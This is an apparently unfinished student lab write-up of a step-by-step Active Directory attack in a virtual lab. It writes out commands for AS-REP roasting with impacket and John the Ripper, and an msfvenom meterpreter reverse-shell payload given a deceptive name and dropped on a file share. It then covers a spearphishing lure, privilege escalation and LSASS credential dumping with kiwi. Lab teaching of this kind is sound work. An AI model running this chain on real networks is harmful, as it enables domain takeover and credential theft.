# Cybersecurity Hacking Lab: Report

This document will present a complete and step-by-step guide to perform a hacking laboratory activity in a virtualized environment, reproducing a fake but realistic scenario.

## Introduction to the activity

### Scenario

This laboratory tries to give an overview of the steps that might be performed by an attacker in a common organization running **Windows Active Directory** in order to take control of an high-privilege account.

The main characteristics of the hypotetical scenario are the following:

 - All the computers and devices of the organization are part of a **domain**, based on **Windows Active Directory**;
 - The domain mainly relies on two (physically and logically) different servers:
	 - A server that acts as **Domain Controller** and **DHCP server**;
	 - Another server that acts as **DNS server** and **File Server**;
 - Domain accounts are divided in two major "groups":
	 - **Domain Administrators**, which have "high privileges" on *all* machines;
	 - **Domain users**, which have "low privileges" on *all* machines;
 - Also, the following policies and settings are enforced:
	 - Domain Administrators are set up to be also **Local Administrators** on *all* the machines;
	 - The DNS server can be accessed only by a specific user (with administrative privileges), who can access only that specific machine;
	 - That last user is configured to perform login **without pre-authentication**;
	 -  **Remote Desktop** access is allowed on the DNS server;
	 - All accounts can **read** a **shared network folder**, which can be written only by administrators;

When not differently specified, all other settings are intented to be the "default" ones.

It is assumed that the organization follows a **bad passwords management**, using common and easily predictable passwords, also for administrators accounts.

### Goal

The main goal of this laboratory is to **gain access to the credentials of a domain administrator account**.

### Threat Model

It is assumed that the attacker:

 - is "located" inside the network and owns the credentials of a domain user account (with low privileges);
 - can contact servers, also from a personal device which is not part of the domain;

## Setting up the Virtual Environment

### Installing the Virtual Machines

This activity requires the set-up of a virtual environment, in which the following machines need to be installed:
 - **2** VMs running **Windows Server 2012**;
 - **1** VM running **Windows 7**;
 - **1** VM running **Kali Linux**;

Any virtualization software is good: this activity has been built using **Oracle VirtualBox**, so it is necessary to use it if you want to use the provided VMs images.
OS versions are not mandatory, but all the features that will be used must be available.

It is clearly required that all these machines can communicate between each-other, so the virtualizator must be set up for allowing this.

### Configuring the Machines

Once all the machines and their OSs have been installed, it is necessary to properly configure them in order to practicaly realize the described scenario.

Since the configuration of an OS is not the main goal of the document, many details will be omitted; moreover, no added value is given by this part of the guide since the only goal is to recreate the presented scenario.
For these reasons, the images of the already-set-up VMs are provided below and it is strongly suggested to use them; just a few details will

It is strongly suggested to use the VMs images provided below 



In this guide many details will be omitted since the configuration of an OS is not the main goal of the document; it will be just given an outline of the main settings that are needed for each machine and the ways to achieve them.

The **Kali** machine does not require particular configurations: it is only needed that it can communicate in the same network of the domain PCs, so it requires a proper IP address, either assigned statically or dinamically by the DHPC. Moreover, `metasploit` needs to be installed along with some additional packets and libraries like `impacket` and `kiwi`.

The more complex and time-requiring configurations are related to the Active Directory domain environment. They will be briefly outlined here but, essentially, their final goal is to implement the scenario previously presented:

 - The **DomainController/DHCP server** requires the installation of the OS with "default" settings. Then, *Active Directory Domain Services* and *DHCP* functionalities need also to be installed, again with default settings (except for what follows).
	 - DHCP IP-addresses pool can be chosen arbitrarly (e.g. `10.0.2.10-190`); the DNS server must be set so it refers to "our" DNS server (yet to be installed);
	 - The name of the machine is `SERVER`;
	 - The domain name is `cybersec.units.it`;
	 - The following domain accounts (with related passwords) need to be created:
		 - **`DomainUser`** (password: `User00!`), joining the `DomainUsers` group;
		 - **`DomainUserNoAuth`** (password: `User00!`), joining the `DomainUsers` group, requires NO Kerberos pre-authentication;
		 - **`DomainAdmin`** (password: `Admin00!`), joining the `DomainUsers`, `DomainAdmins`, `Administrators` groups;
		 - **`DNSoperator`** (password: `Qwerty123`), joining the `DomainUsers`, `DnsAdmins`, `DnsUpdateProxy` groups, can login only on the DNS server;
		 - ACCOUNT ADMIN LOCALE
 - 
==RIMANDO A CONFIGURAZIONI COME DA SCENARIO --> CITARE PRINCIPALI MODI PER REALIZZARE LO SCENARIO: utenti e come realizzare le ipotesi di lavoro (a grandi linee)==

==impacket deve essere installato su Kali (in generale, tutti i pacchetti/comandi usati)==

==IP Kali 10.0.2.15==

## Let's start Hacking!

Once set-up the environment as reported, it is finally possible to begin the laboratory!

Please notice that, unless it is specifically reported, all the actions are intended to be performed from the **Kali Linux** machine, located in the same network of the other devices but NOT part of the Active Directory Domain Services.

==ACCOUNT CONTROLLATO DALL'UTENTE==

 0. **Open a Shell:**
 In order to perform all the following actions, a shell needs to be available on the Kali Linux machine.
 1. **Finding the IP address of the Domain Controller**:
 To begin, we need to find the IP address of the Domain Controller.
 For doing so, we execute the following command: 
 
    `nmap -p 389 -A -v -Pn 10.0.2.0/24`
    
    which tries to contact all the IP addresses in the range `10.0.2.0 - 10.0.2.255` on port  **389** (LDAP) to check whether it is open and the device is ready to accept requests.

	From the response, we find out that the DomainController has IPv4 address **`10.0.2.200`**.
	
	 ![Response of the nmap request](https://raw.githubusercontent.com/AM311/Cybersecurity_Report/main/img/nmap_DC.png)

2. **Ask the DC the list of accounts which do not require Kerberos pre-authentication**:
As first attempt, we ask the DomainController the list of all accounts that can authenticate via Kerberos without pre-authentication: hopefully, we will find a Domain Administrator account using which we will be able to login to the DC.

	For doing this, we run a specific LDAP query to the DC, generated by our legitimate account, using the following command:
	
    `impacket-GetNPUsers -dc-ip 10.0.2.200 cybersec.units.it/DomainUser:User00!`
    
    As it is shown below, there are two domain accounts that soddisfy the requests.
    We will focus our next efforts on `DNSoperator` since, as the name states, it will probably be authorized to operate on the **DNS/File Server**.
    
	![Accounts that does not require pre-auth](https://github.com/AM311/Cybersecurity_Report/blob/main/img/noPreAuth.png?raw=true)

	==DIMOSTRARE CHE QUELL'ACCOUNT PUÒ CONNETTERSI SOLO AL DNS (altrimenti basterebbe così!)==
	
 3. **Ask for a TGT for these accounts:**
 Using the following command we ask the DC for a TGT foreach of the previous accounts and we format them so that they are ready to be cracked using *John the Ripper*:

    `impacket-GetNPUsers -dc-ip 10.0.2.200 cybersec.units.it/DomainUser:User00! -request -format john`

	From the output, we copy the string referring to the desired account (*as shown below*) in a **text file** called `usernames.txt` and located on the desktop.
	
	   `$krb5asrep$DNSoperator@CYBERSEC.UNITS.IT:8690a5aa5b288a036a49126539f292ef$afe3e87aafc
	    35690745c5dfeb1f459dcc1ed858f1f4755d3aefa12921c93dbc35b35c0fd6094be7390eab67e0c016f96
	    efad6f7ed8343a734e0f401c91ec09a83d11542d377f0d1daf690d7205a3b5d8316a2d1afdd0a6ac4b3e9
	    2fb4d6d295a60b074e549aa6a7c0e24cccfd7dd96cfdb06f908d38de6cb775f4fa44b5eae69bc2452fdfb
	    bfa6ca73a70233a2f64e778d3bd286047a69ddf6fd99379b264f747034c32c66971240bede9becb6150fc
	    85d516545f661aef05c22fc5c26a210a4243627cf681ea61f45996fb8d235b3f9d972433c390ff3b4250f
	    576c96c54d167a61a76717831eb320b84aa37acef60cd3f1c781bf6e`

 
 4. **Perform AS-Rep Roasting:**
 As said, we will now try to crack the password used for encoding the response obtained together with the TGT, performing a so-called AS-Rep Roasting attack.
	For doing so, we will use **John the Ripper**, basing the offline-guessing activity on a password dictionary called `rockyou`.
	
    `john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep ./Desktop/usernames.txt`

	"Fortunately", the password is present in the dictionary, so *john* finds it immediately: it is **`Qwerty123`**.
	
	![Result of the offline guessing with John the Ripper](https://github.com/AM311/Cybersecurity_Report/blob/main/img/asRepRoasting.png?raw=true)

	 Thanks to this, we now know the credentials of an Admin account authorized to connect to the DNS/File server; so, we now try to do so.

	==VERIFICARE CHE SI POSSA FARE DESKTOP REMOTO==
 
 5. **Open a remote connection to the DNS/File Server:**
 Now that we know the credentials for an account that can logon to the DNS/File Server, we can open a connection to that machine and perform some "useful" actions!
To open a remote desktop connection, we can use the following command directly from the Kali Linux machine:

    `rdesktop 10.0.2.250 -u DNSoperator -p Qwerty123 -d cybersec.units.it -r disk:share=~/Desktop/share`

	Using the option `-r disk:share=~/Desktop/share` we can share the folder `share` between the Kali Linux machine and the remote DNS/File Server, so we are able to easily move documents between the two devices.
 
 6. **Generation of a payload for starting a reverse shell and injection:**
	In a different shell window, we now proceed with the generation of an exploit through which we will try to inject a reverse shell client to the computers of the organization.
	We will use **`meterpreter`** as reverse shell; for doing so, we run the following command on the Kali Linux machine to generate a payload that launches the reverse shell client:

    `msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=10.0.2.15 -b "\x00" -f exe -o ./Desktop/WorkshiftsManager.exe`

	 `msfvenom` is a pre-installed payload generator and encoder available on Kali, through which we build a `.exe` file executable on all Windows devices. This payload will spawn a reverse shell client, which will connect to the reverse shell server listening on the Kali machine (`10.0.2.15`) on the default TCP port (`4444`).

	The output of the command execution is a `.exe` file that we will find on the Kali's desktop.
	The name of the executable (`WorkShiftsManager.exe`) is deliberately misleading since we want not to raise any suspicion.
	
	We now need to **inject** the exploit into the systems. For doing so, we can easily rely on the remote desktop connection that we have already opened: we copy the executable file into the folder shared between Kali and the server; then, from the remote desktop window that controls the server, we copy the file into the network shared folder.
	Doing so, all the account of the organization will be able to see (and execute) that file.
	
 7. **Run the reverse shell server:**
	For allowing us to take control of a machine, we obviously need to start the reverse shell server on our Kali Linux machine.
	For doing so, we launch the following command:
	
	`msfconsole -r ./Desktop/meterpreter.rc`
	
	where `msfconsole` is a CLI through which it is possible to interact with the Metasploit Framework and `meterpreter.rx` is a script, previously created, made up of the following commands:
	
	```
	use exploit/multi/handler
	set PAYLOAD windows/meterpreter/reverse_tcp
	set LHOST 10.0.2.15
	set ExitOnSession false
	exploit -j -z
	```
	The script, basically, starts a generic payload handler and makes it listening on the default port of the current machine for incoming connections from a `windows/meterpreter/reverse_tcp` payload, which is the one that we have injected.
	
 8. **"Convince" a Domain Administrator to run the executable:**
	In order to make this whole system effectively work, we need to "convince" a domain administrator to run the executable: doing so, we will be able to communicate to a process (the reverse shell client) running with high-privileges (remember: all domain administrators are also local administrators), so we will be able to **steal the credentials** of the logged account.
 
	 To identify the target account, we run a LDAP query for listing all the domain accounts:

	   `impacket-GetADUsers -dc-ip 10.0.2.200 -all -ts cybersec.units.it/DomainUser:User00!`

	Which gives the following output:
	
	![All domain accounts](https://github.com/AM311/Cybersecurity_Report/blob/main/img/allUsers.png?raw=true)
		
	It seems quite obvious that **`DomainAdmin`** will be a good target, so we use the given email to send a spearphishing message:
	![Phishing email sent to the domain administrator](https://github.com/AM311/Cybersecurity_Report/blob/main/img/email.png?raw=true)

	Hopefully, the user will anywhen run the process as instructed.

	> 	The technical details for sending a phishing message with a credible/lookalike/spoofed sending address are out of this guide.

	==NOTE SU MOTIVO DI RUN AS ADMIN -- COLLEGAMENTO A NOTA ESPLICATIVA==
	
 9. **Communication between devices and Privilege Escalation:**
	 Once the user has followed the instructions and run the exploit, on the Kali machine we should see that a new session (with a given numeric ID) has been opened. Typing `sessions -i <ID>` we launch the `meterpreter` CLI with that endpoint and are ready to communicate.

	Now that we are able to send requests to the infected machine, we firstly check the identity of the process that runs `meterpreter` on that device invoking the `getuid` command: as shown in the image below, the process is owned by the domain account `DomainAdmin`.
	
	In order to complete our future tasks, we need to run the process as `SYSTEM`. For doing so, we run the `getsystem` command[^1]. If the execution is successfully completed, running again `getuid` we will now be running as `SYSTEM`.

	[^1]: `getsystem` requires the process to be run as administrator (to be "previously" authorized to run with high privileges, due to Windows UAC); then, it tries three techniques to achieve Privilege Escalation. More details [here](https://docs.rapid7.com/metasploit/meterpreter-getsystem/).

	![Privilege escalation on msfconsole](https://github.com/AM311/Cybersecurity_Report/blob/main/img/msfconsole_getuid-system.png?raw=true)

 10. **Steal the credentials of the logged account:**
	 Now that we are running as SYSTEM, we can finally dump the credentials of all the logged-in accounts from the LSASS memory.
	 
	 For doing so, we firstly need to run the **kiwi** extension, using the command `load kiwi`, then invoking `creds_all` we are finally able to gain all the available credentials in memory, some in a hashed form while other directly in clear text.

		==SPECIFICARE VARIE TIPOLOGIE DI CREDENZIALI==
		
		![All credentials stolen from the memory](https://github.com/AM311/Cybersecurity_Report/blob/main/img/credentials.png?raw=true)



## Credits

hhhh
<!--stackedit_data:
eyJoaXN0b3J5IjpbMTQyODU5MDU2MCwxNjk5NTEwMzcyLDU1MT
IwNzk3MCwtMTYyNzM5MTI0MSwtMzMxNTc0MjcwLC0xNzA3NTg3
MTUwLDE2MjMxMTM1OTEsNzQxNzUxNTA5LDE2OTUyMDAyNjgsMT
YyOTQ1Mzk5MSwxMzI4NjI3NzYsMjM5OTcxODYzLDExNDMzNTY1
NDUsLTgzMTM1NjMxMCwtMjg2MTU2NjcyLDUxOTUzNDQ2OCwtMj
k3NjM3NDcsLTQ1NDI2ODczOSwtNTYzNjYxMDUsLTE4NDMzODI2
NjNdfQ==
-->